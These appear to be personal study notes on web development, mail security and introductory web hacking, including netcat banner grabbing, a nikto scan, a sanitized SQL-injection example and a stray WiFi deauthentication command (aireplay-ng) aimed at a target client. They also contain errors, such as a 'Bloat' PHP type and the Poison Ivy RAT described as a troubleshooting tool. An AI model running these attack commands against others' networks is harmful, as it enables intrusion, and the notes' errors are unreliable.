* Web Design
** Bootstrap

   Free and open-source CSS framework directed at responsive,
   mobile-first front-end web development. It contains CSS and
   optionally JavaScript based design templates for typography, forms,
   buttons, nvigation and other interface components.

   Front-end Web Development is the practice of converting data to a
   graphical interface, through the use of HTML, CSS and JavaScript
   so that users can view and interact with that data.

** PHP

   If you want to make dinamic page install PHP in your server

   PHP can manage your page as modules, making a more clean and easy
   job. Do this using Include or Require to add a file

   All PHP variables start with $
  
   PHP can live in HTML code perfectly with '<?php ... ?>'

   HTML bold tags and such can be used inside PHP's echo declaration
  
   PHP coments start with // for one line and "/* ... */" for several
   lines
  
   In PHP, Variables must:

   1. start with a letter or a "_" in its name
   2. The name of the variable cannot start with a number
   3. Can only contain alphanumeric characters and "_"
   4. A Sensible to mayus

   The types of variables in PHP can be: 

   - String
   - Boolean
   - Bloat
   - Integer

   PHP automatically 'transforms' the type of the variable to the one
   needed, so if you want to print a Integer, it's automatically
   transformed into string.

   PHP can mainly perform:

   - Generate contain on a web page and make it dinamic
   - Modify a file as you would normaly in any OS in the server side
     (create, write, delete, deploy, etc)
   - Recopile information written in formularies
   - Insertion, delete and modification of information on a data base
   - Managing users access
   - Data encryption

   PHP can also be used inside HTML not only by "<?php ... ?> ", but
   also by using the "<script language="php"> ... </script>" tag. If
   the server supports it, PHP abbreviated tag '<? ... ?>'

   PHP has a 'echo' functin which give text output. More specific, it
   isn't a function, more a language constructor. As is, it doesn't
   require '()'

   Every PHP declaration ends with a ';'

   PHP scripts are runned in the server side, not by the client

** HTML

  HTTPs is important, use certbot in your server to get it

  HTML is tags, having a basic skeleton for your page is good, and you
  can also use templates, if there's a tag you don't understand,
  search it in: w3schools, works with CSS too

  HTML is a set of instructions that explains how information sent
  from a web server (Apache, IIS) is to be displayed in a browser.
  The World Wide Web Consortium (W3C) is the standards organization
  governing the workings of HTML. 

  HTML can also provide data entry forms, for server-side processing
  by a higher level language (Perl, PHP, etc). In a business setting
  this is where HTML is most useful, but in a hacker setting this is
  where HTML is most vulnerable.

  HTML is supposed to be a standard format across all platforms
  (browsers and operating systems), yet this isn't always the
  case. Some browsers read the HTML slightly different that other
  browsers just as other OS's wont be compatible with other operating
  systems. Be sure to cross check your HTML code against other types
  of browsers to ensure it is interpreted correctly.

  The new flavor of HTML, HTML5, brings a lot of security
  improvements. It doesn't require flash to stream videos, which is a
  huge leap in terms of preventing unwanted tracking and the endless
  vulnerabilities of Flash.

  On the other hand, it carries a whole stack of new problems with it.

  Cross Domain Messaging (PostMessage) or Web Messaging lets HTML5
  escape the hacks used in HTML4 when documents come from more than one
  source. This kind of messaging requires a lot of trust - and some
  very secure coding.

  Cross Origin Resource Sharing is when a web server allows its
  resources to be used by a separate domain. Again, this is cool way
  to mash up content from multiple sources - but this level of trust
  just begs to be cracked.

  WebSockets provides asynchronous full duplex communication. That's a
  mouthful, but eseentially it means your browser can bypass the usual
  security measures in return for pure speed.

  Local Storage APIs let web pages store data on your computer. Did
  you know all contemporary browsers include a mini-database called
  SQLite? Now jus wonder: what's stored on your computers database?
  All kinds of interesting things about you, right?

*** HTML Injection and XSS

    When a payload travels from a URL parameter to a cookie and back
    again, say farewell to your security.
    
    The payload is the part of transmitted data that is the actual
    intended message. Headers and metadata are sent only to enable
    payload delivery.

    When you send API requests you are trying to get a service to 'do
    something.' The service will then tell you what it did or give you
    what it asked for. The payload is the part of that response that
    is communicating directly to you.

    Let's say you see a random picture of a cat. You go to the cat API
    and you send an API request. You get back an JSON object with a
    link to a cat picture along with a few other pieces of
    information. That JSON is the payload.

    Payload isn't something you get frojm the server. You can also
    send payload to the server as well. This is known as the body of
    your request and is once again usually a JSON object that you send
    to the server. It is used to make more complex request or when you
    are trying to create or modify an object on the service and you
    need to give it information about the object you are creating.

    The payload is the data you are interested in transporting. This
    is differentiated with the things that wrap the data for transport
    like the HTTP/S Request/Responde headers, authentication, etc...

    The term 'payload' is used to distinguish between the
    'interesting' information in a chunk of dta or similar, and the
    overhead to support it. It is borrowed for transportation, where
    it refers to the part of the load that 'pays': for example, a
    tanker truck may carry 20 tons of oil, but the fully loaded
    vehicle weighs much more than that, buit the customer only pays
    for and cares about the oil, this oil is the 'pay-load'

    In programming, the most common usage of the term is in the
    context of message protocols, to differentiate the protocol
    overhead from the actual data. Take, for example, a JSON web
    service response that might look like this:

    #+BEGIN_SRC 
    
    {
       "status":"OK",
       "data":
           {
	        "message":"Hello, world!"
           }
    }	   

    #+END_SRC
    
    In this example, the string is the payload, the part that the
    recipient is interested in; the rest, while vital information, is
    protocol overhead.

    Another notable use of the term is in malware. malicious software
    usually has two objectives: spreading itself, and performing some
    kind of modification on the target system. The spreading part is
    the overhead, while the code thawt does the actual evil0doing is
    the payload.

    - Database :: A database is just a collection of organized
                  information.
    - API keys :: API keys allow you to access databases, kind of like
                  a username and password. When you sign up to a
                  service, you are provided with a unique set of API
                  keys.
    - Query :: Request to get information from a database
    - API Request :: Query to a database for a API

    API stands for Application Programming Interface, it is a way to
    communicate between applications.

    In computer programming, and APi is a set of subroutine
    definitions, protocols, and tools for buildiong software and
    applications. A good API makes it easier to develop a program by
    providing all the building blocks, which are then put together by
    the programmer. An API may be for a web-based system, operating
    system, database system, computer hardware or software library. An
    API specification can take many forms, but often include
    specification for routines, data structures, object classes,
    variables or remote calls. POSIX, Microsoft Windows API, the C++
    Standard Teplate library and Java APIs are examples of different
    forms of APIs.

    Every time you make a call to a server in name of an application
    using a SDKs or a API, it counts as an API request. logins, saves,
    queries are examplesoperations counted as API requests among other
    types of operations. For example, you downloaded an app on your
    smartphone, opened it and the application asked your Email and
    Password. At the moment you press Register and send your data to
    the API it is counted as one API request.

    You have to access the database of the service you are registering
    it, in order for your information to be saved, so an API request
    and API are used to access a database.

    Any code that you can call has an API.

    Making a request to an API, you probably talking about any kind of
    web hosted service that you can request via the HTTP protocol. In
    that case, an API is all the HTTP URIs available for yout call.

    A file in a web server can be requested with multiple HTTP verbs
    such as GET, POST< PUT and so on. All those combinations of URIs
    and HTTP verbs form the API to an web service.

    Representational State Transfer (REST) is a software architectural
    style that defines a set of constraints to be used for creating
    Web services. Web services that conform to the REST architectural
    style, called RESTful Web services, provide interoperability
    between computer systems on the internet.

    RESTful Web services allow the requesting systems to access and
    manipulate textual representations of Web resources by using a
    uniform and predefines set of stateless operations. Other kinds of
    Web services, such as SOAP Web services, expose their own
    arbitrary set of operations.
    
    "Web Resources" were first defined on the World Wide Web as
    document for files identified by their URLs. However, roday they
    have a much more generic and abstrac definition that encompasses
    every thing or entity that can be identified, named, addresses, or
    handled, in any way whatsoever, on the Web. in a RESTful Web
    service, requests made to a sresource's URI will elicit a response
    with a payload formatted in HTML, XML, JSON, or some other
    format. The response can confirm that some alteration has been
    made to the stored resource, and the response can provide
    hypertext links to other related resources or collections of
    resources. When HTTP is used, as is most common, the operations
    (HTTP methods) available are GET, HEAD, POST, PUT, PATCH, DELETE,
    CONNECT, OPTIONS and TRACE.

    By using a stateless protocol and standard operations, RESTful
    systems aim for fast performance, reliability, and the ability to
    grow by reusing components that can be managed and updated without
    affecting the system as a whole, even while it is running.

    The GET method is sage, meaning that applying it to a resource
    does not result in a state change of the resource. The GET, PUT
    and DELETE methods arre idempotent, meaning that applying them
    multiple times to a resource result in the same state change of
    the resource as applying them once, though the response might
    differ.

*** Cross Domain Messaging (HTML5)

    Due to the same origin policy restrictions before HTML5, sending
    messages between windows was only possible if both windows used
    the same protocol, port and host.

    With HTML5, all those restrictions are gone and we can now pass
    messages across domains without having to worry about Same Origin
    Policy restrictions.

    HTML5 has a new method called postMessage(). Using this, we can
    pass messages between windows regardles of their origin.

** Apache

   Once a server with GNU/Linux installed is adquired (preferably
   Debian), update the system  and install apache to generate a
   document root of your page (the "home" of your page).

   The document root is the start of your page, where all the files
   that you will share will be, the root of your page.

   Apache is a web server.

   A web server is the software that receives your request to access a
   web page. It runs a few security checks on your HTTP request and
   takes you to the web page. Depending on the page you have
   requested, the page may ask the server to run a few extra modules
   while generating the document to serve you. It then serves you the
   document you requested.

** JavaScript

   To interesting visuals, Javascript

** MariaDB (MySQL)

   To manage data (necessary in some CMS as Odoo), install MariaDB or
   MySQL

   MariaDB is used a lot in webpages

** CMS

   Joomla is an Open Source CMS
** CSS

   CSS is very good for your page, and learning positioning is a good
   thing to do.

   CSS positioting, there are five position:

   Static position: Normal behavior

   #+BEGIN_SRC css

     h1{
	 position: static;
     }    

   #+END_SRC

   Position Relative: after adding position relative to an item, we
   now have access to four more properties, top, bottom, left and
   right.

   This moves the item anywhere we want based on its original
   position.
   
   We now have control over any direction, this from its original
   position:

   #+BEGIN_SRC css

     .item1{
	 background-color: #508AA8;
	 position: relative;
	 top: 50px;
	 left: 50px;
	 bottom: 50px;
	 right: 50px;
     }

   #+END_SRC
   
   Position absolute: If we add bottom of 0px, it's gonna be 0px away
   from the bottom.

   Position fixed: It will be stuck always on the screen.

   Position sticky: top: 0;. It's gonna stick in the top.

** HTTPS
  
   To add HTTPS to a Server, thus the Web Page, use certbot

* Mail Security
  
  Use GPG for good email security

  GPG's encrypted mail contains an attachment flagged as GPG, or a
  textblock with a header that tells a GPG-capable email client it has
  just received an encrypted message. 

  After receiving an encrypted mail, an email client will access your
  private key (possibly via password) and decrypt the message.

  If a encrypted message was not encrypted with your public key, any
  decryption with your key will fail.

  If the encrypted message was signed by the sender, the GPG plugin
  will use the corresponding public key to verify that signature.

  GPG plugins alert you to problems with signatures or attachments.

   GPG is not easy to implement in a webmail environment, this also
   implies to trust the third party tool you're using, since a MIM can
   exist.
   
   expiration doesn't stop the keys from working.

   To another person: aireplay-ng -0 0 -a (MAC AP) -c (TARGET) -x 150 (device in
   monitor mode).

   Email Server-Side Vulnerabilities and Threats

   Bandwidth Eating

   The ability to inspect email traffic (outbound and especially
   inbound) is needed on an email server, as well as filtering bad
   emails will save bandwidth and CPI server processing. Fail to do
   this will be a possibly infected and slow server.
   
   One technique consist on eliminate an email after a certain amount
   of time, this prevents deleting of email traffic that the user
   might be expecting.

   In a mail server, any user with admin privileges should not read or
   send any email, those privileges are only used for internal network maintenance

   Email Server Threats:

   Large web email cleints like Gmail or Microsoft use DomainKeys
   Identified Mail (DKIM) as a cryptographic email signature program
   for security.

   DKIM wraps a cryptographic signature around an email that verifies
   the domain name that the message was sent through. DKIM helps
   filter out spoofed messages from legitimate ones.

   DKIM test messages carry a problem, any person could send a falh
   that it is testing DKIM in messages. Some recipiens will accept
   DKIM messages in testing mode when the messages should be trated as
   if they were not DKIM signed.

   Also, DKIM signature key is small, so it could be cracked and
   discovered by a hacker. This information then be used for spoof or
   send malware using the user's discovered email key and address.
   
   DKIM is designed to act as a "trust" verification tool for
   email. The system uses public-key cryptography, like PGP. With
   proper use, an email can be traced back to its original sender
   through a domain verification process. This is called non-repudiation.

   In non-repudiation the information provided cannot be changed, the
   information is not refutable. This is important when dealing with contracts.

   WpsSyns is to enter network by several PINs and MAC addresses. (for android)

   A simple but often missed email security method is scanning of all email
   attachments. Scanning needs to be performed on all data packets, compressed
   files, unknown file types, split files, files that can do the splits, files
   that spit, meta data, files with URLs, and pretty much every type
   of file.

   One should  use Data Loss Prevention (DLP).

   Keyword filtering is a type of application layer filtering that lets
   you block all messages containing particular keywords or phrases that commonly
   appear in spam. Other forms of email filtering include:

   Address Blocking: blocks mail from particular IP addresses, email addresses or
   domain of known spammers.

   Bayesian Filtering: "intelligent" software that can analyze spam messages and
   learn to recognize other messages as spam using heuristics (patterns of
   behavior).

   Blacklisting: List of known spammers' addresses can be shared, so each user
   doesn't have to develop a list from scratch. THese lists are available from
   several providers, and are highly valuable for address blocking.

   Whitelisting: Instead of specifying which senders should be blocked, specifies
   which senders wshould be allowed. Again, these lists are used as part of
   address blocking.

   Greylisting: Temporarily blocks email from unknown
   sources. Legitimate email will be re-transmitted, but spam usually
   won't.

   Challenge/Response filtering: replies to email from senders not on a "trusted
   senders" list with a challenge, usually involving solving a task that is easy
   for humans but difficult for automated bots or scripts.

   There are open-souce or payed applications that do filtering.

* Android Hacking
  
  You need a PC, you have to first, open ports

* Fundamentals of Web Security

  TCP mission is to deliver packets of date from one source to a destinationl


  The web seem pretty simple: you get onto the Internet, open a
  browser, type in a website URL, and the page appears. But the
  devil's in the details, and some of them can hurt you.

  For standards of the web and history, visit http://www.w3.org. These
  standards and definitions might teach you how to be sage. But the
  people who want to hurt you don't follow standards or laws.

  1. You open your browser.
     
  2. You type in the Uniform Resource Locator (URL) into the browser's
     address line (the website address, like ISECOM.org; also called
     URI for Uniform Resource Indicators.

  3. The website URL is saved in the browser's history on the hard
     disk. There's a record of every page, as cache.

  4. Your computer asks your default Domain Name Server (DNS) to look
     up the IP address of the website. The DNS connects the name
     www.ISECOM.ORG to the IP address of 216.92.116.13. Use ping for
     this.

  5. Your computer connects to the website's server, at the IP address
     it was given by the DNS, to TCP port 80 for "http://" websites,
     or TCP port 443 if you go to an "https://" secure web site. If
     you use https:// there are more steps like getting server
     certificates that we won't cover in this example.

  6. Your computer request the page you ask for (like index.html), or
     if you specify a folder the web server sends a default page,
     usually index.html. It's the server that decides this default
     file, not your browser.

  7. Your IP address, the web page you are visiting and details about
     your browser are likely to be stored on the web server and/or
     proxy servers in between.

  8. The requested we page is stored in the browsers cache. 

  9. Most web pages contain other elements, pictures, ads, style
     sheets, Javascript. All these elements are retrieved by the web
     server and sended to the client.

  10. The browser shows you what it has stored on your browser's
      cache. There's a difference between "perceived speed" and
      "actual speed". This is the difference between how fast
      something is downloaded (actual) and how fast your browser and
      computer can render the page and graphics to show them to you
      (perceived). Just because you didn't see web page elements
      doesn't mean it didn't end up in your browser's cache.

      The Web is a massive client-server network. Clients are typical
      users who run web browsers to display or capture Internet
      data. Servers are web servers, such a Internet Information
      Server (ISS) on Windows or Apache on Unix/linux. So the browser
      asks for a page, and the web server returns content in the form
      of Hyper Text Markup Language (HTML) pages.

      Standard HTML pages are transferred using Hyper Text Transfer
      Protocol (HTTP). It's a simple text-based system for connecting
      to a server, making a request and getting an answer. This means
      that we also can connect easily to a server using command line
      tools like telner and netcat, and get information about what
      software is running on a specific server. Look at what you get
      when you run this simple two-line command:

      netcat isecom.org 80

      HEAD / HTTP/1.0

      HTTP/1.1 200 OK 
      Date: Wed, 29 Deb 2019 23:25:54 GMT
      Server: Apache/2.2.22
      Last-Modified: Tue, 07 Deb 2019 18:41:18 GMT
      ETag: "3dad-4b8641fe2280"
      Accept-Ranges: bytes
      ContentLength: 15789
      Identity: The Institute for Security and Open Methodologies
      P3P: NOt supported at this time
      Connection: close
      Content-Type: text/html

      Every web server and version will return different information
      at this request - an IIS server will return the following:

      netcat www.microsoft.com 80

      HEAD / HTTP/1.0
      
      HTTP/1.1 200 OK
       Connection:close
       Date: .......... GMT
       Server: Microsoft-IIS/6.0
       P3P: CP="ALL IND DSP COR ADM CONo CUR CUSo IVAo IVDo PSA PSD
      TAI TELo OUR SAMo CNT COM INT NAV ONL PHY PRE PUR UNI"
       X-Powered-By: ASP.NET
       X-AspNet-Version: 1.1.4322
       Cache-Control: public, max-age=9057
       Expires: ....... GMT
       Last-Modified: ..... GMT
       Content-Type: text/html
       Content-Lenght: 12934
       
  Getting More Details:
 
  You can take this further and obtain more information by using the
  "OPTIONS" modifier in the HTTP request:

  netcat isecom.org 80
  OPTIONS / HTTP/1.0

  This gives you all of the HTTP commands (or "methods") to which the
  server will respond in a specific directory (in this case "/", the
  root directory of the web server or "document root").


  Notice that HTTP is completelty in the clear"; everyone can see what
  you're browsing for. 

  Secure Searching

  Nikto is a Perl script that carries out various tests
  automatically. It runs a scan and provides a detailed report:

  ./nikto.pl -host www.hackerhighSchool.org

  Almost every one of nikto's lines represent a possible vulnerability
  or exploitable code. Using various options you can fine tune nikto
  to do exactly what you need, including stealth scans, mutation and
  cookie detection.

  Finding a vulnerability is all well and good but what you do with
  that information is a whole different story. Security professionals
  will take the scan results of their own web server and patch,
  update, remove, repair or do whatever they need to do in order to
  close each vulnerability. 

  One can use several databases
  (http://mire.org/work/cibersecurity.html) that collect and catalog
  every known vulnerability you could imagine.

  These databases, "Common Weakness Enumeration (CWE)" and "Common
  Vulnerabilities and Exposures (CVE)" are simple to operate. These
  systems are a collection of other tools and data with a search
  engine built into each datatabase. Each data repository is focused
  on different aspects of hardware, software, services, system
  configurations, and compliance requirements.

  Looking at the results nikto gave us earlier, you can see near the
  bottom of the log are the letters OSVDB followed by a bunch of
  numbers. OSVDB stands for the Open Source Vulnerability Database
  located at OSVDB.org. In the log results from nikto the numbers
  after OSVDB identify a specific type of vulnerability.

  HTTP in plain text isn't good for security, if the file is
  'retrieved' it can be seen fully, one should always add encryption.

  This encryption is added using SSL/TLS (or simply SSL), a
  cryptographic suite encompassing secure ciphers implementing 40 to
  128 bit (or mode) symmetric key encryption methods.

  40 bit is weaker than 128 bit. The stronger the key algorithm of
  use, the longer it will take to encrypt and decrypt.

  an open source version is available called "OpenSSL" and can be
  found at openssl.org. It works alongside Transport Layer Security to
  provide an entire library of cryptographic recipes. OpenSSL is a
  command line tool with many options to work with. 

  For known HTTPS attacks there are more complex approaches using
  something called a known cyphertext attack. This involver
  calculating the encryption key by analyzing a large number of
  messages (over a million) to deduce the key. Along with cyphertext,
  you will find multiple attack methods that are discovered everyday.

  You shouldn't rush to try and crack 128 bit encryption. Since SSL
  just encrypts standard HTTP traffic, if we set up an *SSL tunnel*, we
  can query the server just as we did earlier. Creating an SSL tunnel
  is a snap, especially since there are utilities like openssl and
  stunnel made just for the job.

  SSL is designed around trust. The browsers contain certificates,
  really long numbers that serve as keys. These is a way to check if
  the server is of trust.

  The theory is that if the domain name matches the SSL certificate
  of the server as the domain that we visited then it's
  trustworthy. But a criminal could infiltrate certificate authorities
  and got keys to fake their own server certificates that your browser
  then tells you that are trustworthy.

  ISECOM researched trust, and discovered 10 main properties, there
  are 10 things that need to be evaluated to have logical trust:

  - Size :: The number of subjects the trust extends to.

  - Transparency :: The level of visibility of all operational parts
                    and processes of the subject and its environment.

  - Symmetry of trust :: The vector (direction) of the trust.

  - Subjucation :: The amount of influence of compromise or corruption
                   of the subject.

  - Consistency :: A historical evidence of compromise or corruption
                   of the subject.

  - Integrity :: The amount and timely notice of change within the target.

  - Offsets :: These are offsets of sufficient assurance, the
               compensation paid to the source or punishment for the
               subject when the trust is broken. It's a valued placed
               on the trust with the target.

  - Value of reward :: The financial offset for risk is the amount
       of win ot gain for the source where the potential gain for
       giving trust to the subject is sufficient to offset the risk
       of breach of trust.

  - Components :: This is the number of elements which currently
                  provide resources which the subject relies on either
                  directly or indirectly.

  - Porosity :: This is the amount of separation between the subject
                and the external environment.

  Our parent organization ISECOM pioneered the field of trust
  analysis: the study of reasons we trust - and which reasons are
  actually good ones.

  A proxy server (or just proxy) is a middleman in the HTTP
  transaction process:

  - The client (your browser) sends its request to the proxy

  - The proxy stops and holds your request, then sends its own request
    to the web server

  - The web server (which doesn't even know  who you really are)
    responds to the proxy

  - The proxy relays the response back to the client, completing the
    transaction.

  A proxy can be a server on your own network that lets you pass your
  connection through it. This is handy because it gives you some
  protection, since the proxy hides your identity and acts as a
  firewall between you and the rest of the web. But you can also use a
  proxy server that's our on the Internet, which hides you even better
  (on-line you can find many lists of publicly available proxy, such
  as http://tols.rosinstrument.com/proxy/). These external proxy
  servers provide critical access to the outside world for people in
  countries that censor or cut off their ISP's connections to the
  Internet.

  But, as you might have figured by now, proxy servers are vulnerable
  to attack themselves, and can become jumping-off points for
  launching attacks on other servers. Not to mention that you may be
  going through one and not even be aware of it - which means it's
  recording everything you do. This is something you especially want
  to consider if you use a free public proxy server. There is
  absolutely no guarantee the owner of that proxy is honest and will
  not use your username/password or credit card details. 

  You can run a proxy server right on your local computer. IT won't
  change your souce IP address (because its address is the same as
  yours), but it can prevent caching and filter our undesirable
  content.

  *Privoxy*

  The Onion Router, or TOR, was created to hide your IP address - many
  times over. When you use the TOR network, your traffic gets
  encrypted and passed along through a tangle of routers, and
  eventually emerges .. somewhere. But in theory your traffic can't be
  traced back to you. In theory. In reality, some things - like using
  Flash on Tor - has given unsuspecting users bad surprises.

  Technically, you could set up TOR yourself, which involves some
  interesting configuration. We recommend it for the learning
  experience. However, most of us mere mortals will appreciate the TOR
  Browser, which has all the defaults set for safety, and lets you do
  all that interesting research in a separate browser.

  old-school coding in languages like C++ meant hours of deep coding,
  then compiling binaries, machine-language instructions that run very
  quickly. If you want raw horsepower, and have a swhole lot of time
  on your hands, this is the world for you.

  The rest of us will use scripting languages to write scripts,
  programs written in plain text that are interpreted at runtime by
  binaries (that you don't have to write) underneath. They don't run
  as fast as freestanding binaries, but with the very fast processors
  we have today, you may never notice the difference.

  Scripting languages are great for dynamic web pages, but they also
  create a new avenue of attack for hackers. Most web applications
  vulnerabilities aren't caused by bugs in any particular language,
  but by bad coding and poor web server configuration. For example, if
  a form requests a zip code but the user enters "abcde", the
  application should return them to the form and point out the
  error. This is called input validation. Here are some of the most
  common scripting platforms today:

  Common Gateway Interface (CGI): This is the granddaddy of scripting
  interfaces, and it's not really a language itself; it's a way to run
  scripts. Perl was one of the most popular scripting languages to
  write CGI programs in the early days, though it's not used much for
  web pages anymore. Perl is, however, very useful for hackers, and
  many handy tools are written in this language.

  PHP: PHP is a very popular open-source scripting language that runs
  on the server before the page is sent to the user. THe web server
  uses PHP to get data from databases, respond to user choises and
  build a dynamic page with the information the visitor wants. HTML
  displays static content; PHP lets you create pages that give the
  user dynamic, customized content based on their input. Web pages that
  contain PHP scripting usually have a file name ending in ".php".

  Python: Another popular language, Python is a competitor to PHP, and
  does many of the same things. Many web sites use both PHP and Python
  (as well as other languages), including Google.com, Yahoo.com and
  Amazon.com. Python scripts usually have the file extension .py. In
  the world of security, you ought to know as much as you can about at
  least one language. The flavor used today for security pros is
  Python.

  Active Server Pages (ASP): Web pages that have a .asp or .aspx
  extension (ASPs) are database-driven and dynamically generated just
  like PHP or Python pages. ASP was Microsoft's first server-side
  scripting engine for the web. Its popular successor, ASP.NET, is
  built on the Common Language Runtime (CLR), allowing programmers to
  write code using any supported .NET language, such as: C# VB.NET,
  Jscript.NET, etc. 

  Java Server Pages (JSP): It's a technology that helps software
  developers create dynamically generated web pages. JSP is similar to
  PHP, but it uses the Java programming language. To deploy and run,
  a compatible web server with a servlet contained (such as Apache
  Tomcat) is required.

  Coldfusion and Ruby have their own cult followings, and there are
  dozend less-well-known languages that can do very interesting
  things.

  Javascript: Javascript (NOT the same thing as Java,
  runs on more web pages than any language besides
  HTML. It's different form the scripting languages above, because it
  doesn't run on the server to generate a page. Instead, it runs in
  your browser after the page arrives. This gives you visual effect
  like fly-out menus, expandable and collapsible sections of pages
  and "live" interaction with the page. Practically every dynamic page
  uses Javascript somewhere, and it's the front line of defense for
  validating the information people submit via forms. However, note
  that client-side input validation only is not enough to guarantee
  protection agains attack targetting dynamic web applications
  parameters. One example of ways to abuse client-side scripting is to
  pull up a web page, fill in the form, and capture it with a
  specialized proxy. The proxy lets you rewrite the code in the
  returned page and send it back using bogus values. You could also do
  this by "saving" the web page, editing the code, then sending it
  back using netcat. Or you could simply disable Javascript in your
  browser, using either built-in controls or add-ons.

  Web Vulnerabilities:

  Giving someone what they ask for is simple; selling them something
  is a lot less simple. Online stores, companies selling products,
  bloggers selling ideas and personality, or newspapers selling news -
  all require more than just HTML-encoded tet and pictures. Dynamic
  web sites that market products based on your preferences, show you
  alternatives, recommend other options, up-sell add-ons and make sure
  you pay for what you get require complex software. Ther's no longer
  static web sites, they're web applications. When we say goodbye to
  web sites and hello to web appliciatoins, we enter a whole new world
  of security issues.

  We mentioned earlier "complexity breeds insecurity". Now we are
  going to look at the true meaning behind that mantra. When the
  automobile was first invented, it was nothing more than a wheel, one
  simple wheel. Some folks thought that the wheel was just fine but
  other people wanted to improve on that wheel. These early hackers
  began to add omre wheels together attached with an axle and a
  frame. Others added seats to the frame and still more added a fancy
  horn or installed a horse as the engine. As time went on, this
  simple wheel automobile slowly took shape into a fast multi-horse
  drwan carriage. Luckily, someon added a brake brfore too many other
  got hurt. Today, we have airbags, seat belts, V-8 engines, and
  really great sound systems in our cards without having to smell
  horse dung all the time.

  The Internet's evolutino has progressed in a similar fashion. People
  weren't happy staring at a green isplay screen so they added a color
  monitor. THe old dreary ASCII text became flashing lights and splash
  colors with midi sounds giving way to 3-D surround sound. Each new
  upgrade to the Internet added an ew level complexity, another layer
  of vulnerabilities to consider.

  SQL Injection:

  A SQL Injection isn't so much as an attack agains a web site but
  rather an attack to gain access to databases behind the website. THe
  primary purpose of a SQL Injection is to bypass the webpages. An
  attacker will want to gain either super user privileges to the
  databases associated with the web site or get the web page to dump
  database information into the attacker's hands.

  SQL is the basic building block ofr databases. SQL commands will
  perform whatever task it is asked, including giving up passwords,
  credit card numbers, and so forth. All the attacker is doindg is
  adding rogue SQL code (injecting) to any open form field on a web
  page.

  For example, a web page asks a user if they would like to sign up
  for a monthly newsletter. THe page will have open field fo the user
  to enter their name, email address, and whatever else the web
  builder wants. Each open field allows a user to input text, which is
  then stored in a database. A SQL injection simply requires an
  attacker to input SQL commands into the open fields. If the open
  fields are not protected (parsed) against allowing such commands,
  the attacker can easily type a requesti nto an open field for a
  password list.

  Here is an example of such a SQL request that has been slightly
  sanitized for your protection.
  
  <?php
  $query  = "SELECT '1', concat (uname||'-'||passwd) as name,
  '1971-01-01', '0' from usertable;
                      WHERE size = '$size'";
  $result = odbc_exec($conn, $query);
  
  ?>

  SQL injections are the most popular form of attack vectors. THis
  attack can be rendered useless by correctly filtering SQL escape
  characters in user input fields or building your web site without
  using SQL. Don't forget about the URL field, that's a user input
  field too! Not to mention HTTP headers, cookies and more.

  Buffer Overflows:

  Think of a buffer as a smal cup. THis buffer cup holds a certain
  amount of data and will spill if too much data is added. When the
  buffer cup overflows, because someone ior something tried to add too
  much data, the system behaves strangely. Then a system behaves
  strangely, other weird things can happen. A buffer overflow is an
  attack (or accident) where too much data is forced into a buffer
  that was only built for a certain amount or type of data.

  When we look to the same open fields used in SQL injections, we can
  insert massive amounts of givverish into fields that were designed
  to handle 25 characters. What happens when we add 1 million
  characters th that same field? The web page goes a little crazy and
  can provide an entry point to an attacker.

  Buffer overflows can be avoided by limiting the amount of acceptable
  data to each open field an ensuring rogue code/commands can't be run
  inside these user input fields.

  Cross Site Scripting (XSS):

  Our first two vulnerabilities were direct attacks against a
  server. XSS is a client side vulnerability that exploits a useir's
  trust to gain access into the web servers the client is looking
  at. A good example of this type of attack is when an attacker hitch
  hikes on a users browser while that user is logged in to a security
  site, such as a bank. The attackers preys on the users established
  trust between the user and the bank to gain access.

  The attacker has vaious methods to piggy-back on users
  browsers. Some attackers will establish a Phishing web site or
  created web site that look identical to none the user would vitsit
  Since few people pay any attention to the URL ield in their browser,
  it is fairly common for an attacker to lure a victim into allowing
  malware to be installed in their browser. Email is the preferred
  method to install malware since humans are, well, human.
  
* To read

  The 4-Hour Workweek: Escape 9-5, Live Anywhere, and Join the New Rich

  Tech Interview Handbook github
  
  Free Programming books github (ebook foundation)

  Free for dev (ripienaar)

  You don't need (you don't need)

  zdnet.com (cybersecurity)

  Surveillance

  Techrepublic.com/resources

* Cybersecurity Tips

  Knowing where to look and what to look for is only part of the security
  battle. Networks are constantly being surveyed, analyzed, poked and prodded.
  If the network you are protecting isn't being watched then you aren't using
  the right tools to detect that behavior. If the network you're craking isn't
  being watched, you may (may) get away with scanning it. As a cyber secrity
  expert, you should know every inch of the systems you are protecting - or
  testing. You need to know where the weaknesses are and where the strength are
  as well, regardless of which side you're on.

  Simply gathering up intelligence on a server, such as the operating system
  and open ports, isn't enough these days. An Advanced Persistent Threat will
  try to learn as much about your network as it can. This information
  includes - 

  - Firewall brand, model, firmware version, and software patches that exists

  - Remote connections authentication, access privileges, and processes.

  - Other servers that connect to the network, this includes Email HTML,
    back-up, redundant, off-site, hired or out-sourced services, and even
    contractors that may have used your network or are using it now.

  - Printers, fac machines, photocopiers, wireless routers, and network
    connections in your company waiting room.

  Even though we have covered many topics in this lesson, system identification
  covers an even broader area. There is quite a bit of information that flows
  through networks that identify parts of each device. Each device on the
  network can be exploited and thus used as an entry point for an attacker.
  Approaching this daunting challenge requires more than just software.
  Research your own equipment and learn as much as you can. That knowledge will
  pay off.

  OPN (without password) and WEB (low encryption) is easy hacking

  WPA is very hard to hack, there are three types of attacks

  The common vulnerabilities and exposures database from mitre is
  http://cve.mitre.org

  Another page to visit is http://exploit-db.com

  A Remote Access Toolkit is Poison Ivi, It's very useful for troubleshooting,
  training and breaking into a computer from a distance.

  Sniffing packets is not as simple as plugging your computer into the network
  and capturing traffic. It's often more difficult to decide where to place the
  sniffer than it is to analyze the traffic. The main devices that handle
  network traffic do so differently, so you have to be aware of the network's
  physical setup. So, how do you collect traffic from the network?
  
  First, if you're going to have to collect everyone's traffic, on a wired
  Ethernet network you'll need a mirror port or a trunk port on a switch.
  Otherwise, on a switched network, the only traffic you'll see is a broadcast
  traffic and your own. But be very clear: WiFi is not switched networking.
  WiFi functions like a hub: you can see everyone's packets.
  
  If you're attached to a mirror port or have put your WiFi card into
  promiscuous mode, a packet sniffer applicatoin can monitor network traffic on
  all computers on the network.

  A packet sniffing program is designed to capture the traffic packets that
  move along the network. You get to ckeck out the packet content and make some
  determinations about the validity of the packet. In Linux/Mac/Unix, the
  natice *tcpdump* command can capture traffic, ave it to a file, look for
  search strings and a lot more. WHen you're dealing with automated processess
  (come on, you're a hacker, you want to automate everything), using tcpdump at
  the command line is the way to go.

  The eXif.er, just a web based exif editor. A page when we can see the
  metadata of a image.

  Full-on GUI tools like Wireshark are often called network protocol analyzers.
  They let you capture an interactively browse the traffic running on a
  computer network. Wireshard is the de facto (and often de jure [by law])
  standard across many industies and educational institutions. 

